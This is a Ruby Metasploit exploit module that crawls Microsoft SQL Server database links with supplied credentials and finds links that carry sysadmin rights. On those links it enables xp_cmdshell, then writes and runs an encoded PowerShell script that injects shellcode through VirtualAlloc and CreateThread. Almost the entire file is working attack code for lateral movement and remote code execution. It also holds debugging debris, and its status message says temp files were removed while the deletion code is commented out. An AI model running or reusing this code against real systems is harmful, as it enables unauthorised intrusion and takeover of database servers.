require 'msf/core'
require 'msf/core/exploit/mssql_commands'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	
	include Msf::Exploit::Remote::MSSQL
	include Msf::Auxiliary::Report
	include Msf::Exploit::CmdStagerVBS
	#include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server - Database Link Crawler',
			'Description'    => %q{When provided credentials, this module will crawl 
			 SQL Server database links and identify links configured with sysadmin priveleges.},
			'Author'         =>
				[
					'Antti Rantasaari <antti.rantasaari@netspi.com>',  
					'nullbind <scott.sutherland@netspi.com>'  
				],
			'Platform'      => [ 'Windows' ],
			'License'        => MSF_LICENSE,
			'References'     => [[ 'URL', 'http://www.netspi.com/' ]],
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
		))

		register_options(
			[	
				OptBool.new('VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
				OptBool.new('DEPLOY',  [false, 'Deploy payload via the sysadmin links', 'false']),	
				OptString.new('DEPLOYLIST',  [false,'Comma seperated list of systems to deploy to']),
			
			], self.class)
	end
	
	def exploit		

		# Display start time	
		time1 = Time.new
		print_status("-------------------------------------------------")
		print_status("Start time : #{time1.inspect}") 
		print_status("-------------------------------------------------")		
		
		# Check if credentials are correct
		print_status("Attempting to connect to SQL Server at #{rhost}...")
		
		if (not mssql_login_datastore)
			print_error("Invalid SQL Server credentials")
			print_status("-------------------------------------------------")
			return
		end
				
		# Define master array to keep track of enumerated database information
		masterList = Array.new
		masterList[0] = Hash.new			# Define new hash
		masterList[0]["name"] = ""			# Name of the current database server
		masterList[0]["db_link"] = ""		# Name of the linked database server
		masterList[0]["db_user"] = ""	 	# User configured on the database server link
		masterList[0]["db_sysadmin"] = ""	# Specifies if  the database user configured for the link has sysadmin privileges
		masterList[0]["db_version"] = ""	# Database version of the linked database server
		masterList[0]["db_os"] = ""			# OS of the linked database server
		masterList[0]["path"] = [[]]		# Link path used during crawl - all possible link paths stored
		masterList[0]["done"] = 0			# Used to determine if linked need to be crawled	
		
		# Setup query for gathering information from database servers
		versionQuery = "select @@servername,system_user,is_srvrolemember('sysadmin'),(REPLACE(REPLACE(REPLACE(ltrim((select REPLACE((Left(@@Version,CHARINDEX('-',@@version)-1)),'Microsoft','')+ rtrim(CONVERT(char(30), SERVERPROPERTY('Edition'))) +' '+ RTRIM(CONVERT(char(20), SERVERPROPERTY('ProductLevel')))+ CHAR(10))), CHAR(10), ''), CHAR(13), ''), CHAR(9), '')) as version, RIGHT(@@version, LEN(@@version)- 3 -charindex (' ON ',@@VERSION)) as osver,is_srvrolemember('sysadmin'),(select count(srvname) from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server')as linkcount"
		
		# Run initial query against database entry point 		
		result = mssql_query(versionQuery, false) if mssql_login_datastore
		column_data = result[:rows]
		
		# Populate master list with entry pooint information to start the db link crawl
		column_data.each { |s|
			print_status("Successfully connected to #{rhost} (#{s[0]})")
			masterList[0]["name"] = s[0]
			masterList[0]["db_user"] = s[1]
			masterList[0]["db_sysadmin"] = s[5]
			masterList[0]["db_version"] =  s[3]
			masterList[0]["db_os"] = s[4]	
			masterList[0]["numlinks"] = s[6]
			
			# Translate syadmin code
			status = masterList[0]["db_sysadmin"]
			if status == 1 then
				dbpriv = "sysadmin"		
			else
				dbpriv = "user"			
			end
			
			# Display database entry point configuration
			print_status(" ") if datastore['VERBOSE'] == true
			print_status("  o Server: #{s[0]}") if datastore['VERBOSE'] == true
			print_status("  o User: #{masterList[0]["db_user"]}")	 if datastore['VERBOSE'] == true								
			print_status("  o Privs: #{dbpriv}")	if datastore['VERBOSE'] == true							
			print_status("  o Version: #{masterList[0]["db_version"]}") if datastore['VERBOSE'] == true							
			print_status("  o OS: #{masterList[0]["db_os"].strip}") if datastore['VERBOSE'] == true
			print_status("  o Links on server: #{masterList[0]["numlinks"]}") if datastore['VERBOSE'] == true
			print_status(" ") if datastore['VERBOSE'] == true
			
			# Attempt to deliver a payload to database entry point - ???
			if masterList[0]["db_sysadmin"] == 1 then
				enable_xp_cmdshell([])
			end
		}	
		
		# Create loot table to store configuration information from crawled database server links
		linked_server_table = Rex::Ui::Text::Table.new(
			'Header'  => 'Linked Server Table',
			'Ident'   => 1,			
			'Columns' => ['db_server', 'db_version', 'db_os', 'link_server', 'link_user', 'link_privilege', 'link_version', 'link_os','link_state']
		)	
		save_loot = ""

		# Start crawling through linked database servers
		while masterList.any? {|f| f["done"] == 0}	
			
			# Find the first DB server that has not been crawled (not marked as done)
			server = masterList.detect {|f| f["done"] == 0}
			
			# Select a list of the linked database servers that exist on the current database server
			sql = query_builder(server["path"].first,"",0,"select srvname from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server'") 
			result = mssql_query(sql, false) if mssql_login_datastore
		    print_status("-------------------------------------------------")
			print_status("Crawling links on #{server["name"]}...")	
			print_status("-------------------------------------------------")
			
			# Setup number of db server links
			if server["numlinks"] != nil then
				mynumlinks = server["numlinks"]
			else
				mynumlinks = masterList[0]["numlinks"]
			end
			
			# Display number db server links 
			print_status("  Links found: #{mynumlinks}")
						
			# If links were found, determine if they can be connected to and add to crawl list
			if (result[:done][:rows] > 0)
				# Enable loot
				save_loot = "yes"
				
				result[:rows].each {|i|
					i.each {|i|											
					
						# Check if link works and if sysadmin permissions - temp array to save orig server[path] - ???
						temppath = Array.new
						server["path"].first.each {|j| temppath << j}
						temppath << i

						# Get configuration information from the linked server
						sql = query_builder(temppath,"",0,versionQuery)
						result = mssql_query(sql, false) if mssql_login_datastore	
						
						# Add newly aquired db servers to the masterlist, but don't add them if the link is broken or already exists					
						if result[:errors].empty? and result[:rows] != nil then
																
								# Assign db query results to variables for hash
								parse_results = result[:rows]								
								
								# Add link server information to loot
								link_status = 'up'
								write_to_report(i,server,parse_results,linked_server_table,link_status)
								
								# Display link server information in verbose mode
								show_configs(i,parse_results) if datastore['VERBOSE'] == true
									
								# Add link to masterlist hash
								masterList << add_host(i,server["path"].first,parse_results) unless masterList.any? {|f| f["name"] == i}										
								# Set current link target
								current_link = parse_results[0][0]
								
								# Set db_sysadmin status						
								db_sysadmin = parse_results[0][5]
															
								# Check if the user the link is configured with has sysadmin privileges
								if db_sysadmin == 1 
										
									# Display status to the user	
									if datastore['VERBOSE'] == true
										print_good("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}")
									else
										print_good("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} (Sysadmin!)")
									end
									
									# Deploy payload if deploy is set to true
									if datastore['DEPLOY'] == true
									
										# Unset deploylist if blank
										if datastore['DEPLOYLIST']=="" then
											datastore['DEPLOYLIST'] = nil 
										end 
										
										# Display status to user
										if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true then
											print_status("\t - Checking if #{current_link} is on the deploy list...") 
										end
										
										# Convert deploy list into array for validation check
										deploylist = datastore['DEPLOYLIST'].upcase.split(',') if datastore['DEPLOYLIST'] != nil
											
										# Check if db server is in deploylist;if so then deploy payload	
										if datastore['DEPLOYLIST'] == nil or deploylist.include? current_link.upcase
											
											# Display validation check status 
											if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true then
												print_status("\t - #{current_link} is on the deploy list.") 
											end
											
											# Attempt to deploy payload
											enable_xp_cmdshell(temppath)
										else
										
											# Display validation check status 
											if datastore['DEPLOYLIST'] != nil and datastore["VERBOSE"] == true then
												print_status("\t - #{current_link} is NOT on the deploy list.") 
											end
										end
									end

								else								    
									print_status("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}")	and datastore["VERBOSE"] == true
									
								end								
						else
						
							# Add to report
							linked_server_table << [server["name"],server["db_version"],server["db_os"],i,'NA','NA','NA','NA','Connection Failed'] 
			
							# Display status to user
							print_status(" ") if datastore['VERBOSE'] == true
							print_error("Linked Server: #{i} ") if datastore['VERBOSE'] == true
							print_error("  o Link Path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} - Connection Failed")
							print_status("    Failure could be due to:") if datastore['VERBOSE'] == true
							print_status("    - A dead server") if datastore['VERBOSE'] == true
							print_status("    - Bad credentials") if datastore['VERBOSE'] == true
							print_status("    - Nested open queries through SQL 2000") if datastore['VERBOSE'] == true

						end
					}
				}
			end
			
			# Set server to "crawled"
			server["done"]=1						
		end
				
		print_status("-------------------------------------------------")
		
		# Setup table for loot
		this_service = nil
		if framework.db and framework.db.active
			this_service = report_service(
				:host  => rhost,
				:port => rport,
				:name => 'mssql',
				:proto => 'tcp'
			)
		end
		
		# Display end time	
		time1 = Time.new
		print_status("End time : #{time1.inspect}")
		print_status("-------------------------------------------------")		
		
		# Write log to loot / file
		if (save_loot=="yes")
			filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_linked_servers.csv"
			path = store_loot("crawled_links", "text/plain", datastore['RHOST'], linked_server_table.to_csv, filename, "Linked servers",this_service)
			print_status("Results have been saved to: #{path}")
		end		

    end
		
		
	# ---------------------------------------------------------------------
	# Method that builds nested openquery statements using during crawling
	# ---------------------------------------------------------------------
	def query_builder(path,sql,ticks,execute)
	
		# Temp used to maintain the original masterList[x]["path"]
		temp = Array.new
		path.each {|i| temp << i}
		
		# Actual query - defined when the function originally called - ticks multiplied
		if path.length == 0
			return execute.gsub("'","'"*2**ticks)
			
		# openquery generator
		else
			sql = "select * from openquery(\"" + temp.shift + "\"," + "'"*2**ticks + query_builder(temp,sql,ticks+1,execute) + "'"*2**ticks + ")"
			return sql
		end
	end
	
	# ---------------------------------------------------------------------
	# Method that builds nested openquery statements using during crawling
	# ---------------------------------------------------------------------
	def query_builder_rpc(path,sql,ticks,execute)
	
		# Temp used to maintain the original masterList[x]["path"]
		temp = Array.new
		path.each {|i| temp << i}
		
		# Actual query - defined when the function originally called - ticks multiplied
		if path.length == 0
			return execute.gsub("'","'"*2**ticks)
			
		# Openquery generator
		else
			exec_at = temp.shift
			sql = "exec(" + "'"*2**ticks + query_builder_rpc(temp,sql,ticks+1,execute) + "'"*2**ticks +") at [" + exec_at + "]"
			return sql
		end
	end
		
	
	# ---------------------------------------------------------------------
	# Method for adding new linked database servers to the crawl list
	# ---------------------------------------------------------------------
	def add_host(name,path,parse_results)
	
		# Used to add new servers to masterList
		server = Hash.new
		server["name"] = name				
		temppath = Array.new
		path.each {|i| temppath << i }
		server["path"] = [temppath]
		server["path"].first << name
		server["done"] = 0		
		parse_results.each {|stuff| 						
			server["db_user"] = stuff.at(1)
			server["db_sysadmin"] = stuff.at(2)
			server["db_version"] =  stuff.at(3)
			server["db_os"] = stuff.at(4)	
			server["numlinks"] = stuff.at(6)
		}							
		return server
	end
	
	
	# ---------------------------------------------------------------------
	# Method to display configuration information
	# ---------------------------------------------------------------------
	def show_configs(i,parse_results)
			
		print_status(" ")
		print_status("Linked Server: #{i}")
		parse_results.each {|stuff|  
			
			# Translate syadmin code
			status = stuff.at(5)
			if status == 1 then 
				dbpriv = "sysadmin"		
			else
				dbpriv = "user"			
			end
		
			# Display database link information
			print_status("  o Link user: #{stuff.at(1)}")	 								
			print_status("  o Link privs: #{dbpriv}")				
			print_status("  o Link version: #{stuff.at(3)}") 			
			print_status("  o Link OS: #{stuff.at(4).strip}") 
			print_status("  o Links on server: #{stuff.at(6)}") 	
		}		
	end
	
	
	# ---------------------------------------------------------------------
	# Method for generating the report and loot
	# ---------------------------------------------------------------------
	def write_to_report(i,server,parse_results,linked_server_table,link_status)
		parse_results.each {|stuff| 						
		
			# Parse server information
			db_link_user = stuff.at(1)
			db_link_sysadmin = stuff.at(2)
			db_link_version =  stuff.at(3)
			db_link_os = stuff.at(4)										

			# Add link server to the reporting array and set link_status to 'up'
			linked_server_table << [server["name"],server["db_version"],server["db_os"],i,db_link_user,db_link_sysadmin,db_link_version,db_link_os,link_status] 
			
			return linked_server_table
		}
	end
	
	
	# ---------------------------------------------------------------------
	# Method for enabling xp_cmdshell
	# ---------------------------------------------------------------------
	def enable_xp_cmdshell(path)
	
		# Check if its the entry point
		puts "blah: #{path.inspect}"
		
		# Enables "show advanced options" and xp_cmdshell if needed and possible
		# They cannot be enabled in user transactions (i.e. via openquery)
		# Only enabled if RPC_Out is enabled for linked server
		# All changes are reverted after payload delivery and execution
		
		# Check if "show advanced options" is enabled
		execute = "select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'show advanced options'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		saoOrig = result[:rows].pop.pop
		
		# Check if "xp_cmdshell" is enabled
		execute = "select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'xp_cmdshell'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		xpcmdOrig = result[:rows].pop.pop
		
		# Try blindly to enable "xp_cmdshell" on the linked server
		# Note: 
		# This only works if rpcout is enabled for all links in the link path.
		# If that is not the case it fails cleanly.     		
		if xpcmdOrig == 0 
			if saoOrig == 0
				# Enabling show advanced options and xp_cmdshell
				execute = "sp_configure 'show advanced options',1;reconfigure"
				sql = query_builder_rpc(path,"",0,execute)
				result = mssql_query(sql, false) if mssql_login_datastore
			end
			
			# Enabling xp_cmdshell
			print_status("\t - xp_cmdshell is not enabled on " + path.last + "... Trying to enable")
			execute = "sp_configure 'xp_cmdshell',1;reconfigure"
			sql = query_builder_rpc(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
		end
		
		# Verifying that xp_cmdshell is now enabled (could be unsuccessful due to server policies, total removal etc.)
		execute = "select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'xp_cmdshell'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		xpcmdNow = result[:rows].pop.pop
		
		if xpcmdNow == 1 or xpcmdOrig == 1
			print_status("\t - Enabled xp_cmdshell on " + path.last) if xpcmdOrig == 0		
			powershell_upload_exec(path)			
		else
			print_error("\t - Unable to enable xp_cmdshell on " + path.last)
		end
		
		# Revert soa and xp_cmdshell to original state
		if xpcmdOrig == 0 and xpcmdNow == 1
			print_status("Disabling xp_cmdshell on " + path.last)
			execute = "sp_configure 'xp_cmdshell',0;reconfigure"
			sql = query_builder_rpc(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
		end
		if saoOrig == 0 and xpcmdNow == 1
			execute = "sp_configure 'show advanced options',0;reconfigure"
			sql = query_builder_rpc(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
		end
	end
	
	
	# ----------------------------------------------------------------------
	# Method that delivers shellcode payload via powershell thread injection
	# ----------------------------------------------------------------------
	def powershell_upload_exec(path)
		
		# Create powershell script that will inject shell code from the selected payload		
		myscript ="$code = @\"
[DllImport(\"kernel32.dll\")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(\"kernel32.dll\")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport(\"msvcrt.dll\")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
\"@
$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru
[Byte[]]$sc =#{Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','')}
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)"
		
		# Unicode encode powershell script
		mytext_uni = Rex::Text.to_unicode(myscript) 
		
		# Base64 encode unicode		
		mytext_64 = Rex::Text.encode_base64(mytext_uni)

		# Generate random file names
		rand_filename = rand_text_alpha(8)
		var_duplicates = rand_text_alpha(8)
		
		# Write base64 encoded powershell payload to temp file
		# This is written 2500 characters at a time due to xp_cmdshell ruby function limitations	
		# Also, line number tracking was added so that duplication lines causes by nested linked
        # queries could be found and removed.		
		linenum = 0 
		print_status("\t - Writing base64 powershell temp files to %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates}...")
		mytext_64.scan(/.{1,2500}/).each {|part| 
			execute = "select 1; EXEC master..xp_cmdshell 'powershell -C \"Write \"--#{linenum}--#{part}\" >> %TEMP%\\#{rand_filename}\"'"			
			sql = query_builder(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
			linenum = linenum+1			
		}
		
		# Display status to user
		print_status("\t - Finished writing %TEMP%\\#{rand_filename}.") if datastore['VERBOSE'] == true
		print_status("\t - Removing duplicate lines from %TEMP%\\#{rand_filename}...") if datastore['VERBOSE'] == true
		
		# Remove duplicate lines from temp file and write to new file		
		execute = "select 1;exec master..xp_cmdshell 'powershell -C \"gc %TEMP%\\#{rand_filename}| get-unique > %TEMP%\\#{var_duplicates}\"'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		
		# Remove tracking tags from lines
		execute = "select 1;exec master..xp_cmdshell 'powershell -C \"gc %TEMP%\\#{var_duplicates} | Foreach-Object {$_ -replace \\\"--.*--\\\",\\\"\\\"} | Set-Content %TEMP%\\#{rand_filename}\"'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		
		# Status user
		print_status("\t - Finished removing duplicates in %TEMP%\\#{rand_filename}.") if datastore['VERBOSE'] == true
		
		# Used base64 encoded powershell command so that we could use -noexit and avoid parsing errors
		# If running on 64bit system, 32bit powershell called from syswow64
		powershell_cmd =  "$temppath=(gci env:temp).value;$dacode=(gc $temppath\\#{rand_filename}) -join '';if((gci env:processor_identifier).value -like '*64*'){$psbits=\"C:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -noprofile -encodedCommand $dacode\"} else {$psbits=\"powershell.exe -noexit -noprofile -encodedCommand $dacode\"};iex $psbits"
		powershell_uni = Rex::Text.to_unicode(powershell_cmd) 
		powershell_64 = Rex::Text.encode_base64(powershell_uni)

		# Setup query 
		execute = "select 1; EXEC master..xp_cmdshell 'powershell -EncodedCommand #{powershell_64}'"
		sql = query_builder(path,"",0,execute)
		
		# Execute the playload
		print_status("\t - Executing payload...")
		result = mssql_query(sql, false) if mssql_login_datastore 	 
		
		# Remove payload data from the target server
		print_status("\t - Removing %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates}...") if datastore['VERBOSE'] == true
#		execute = "select 1; EXEC master..xp_cmdshell 'cmd /c del %TEMP%\\#{rand_filename} %TEMP%\\#{var_duplicates}'"
#		sql = query_builder(path,"",0,execute)
#		result = mssql_query(sql,false)
		print_status("\t - Removed temp files %TEMP%\\#{rand_filename} and %TEMP%\\#{var_duplicates}.")
	
	end
end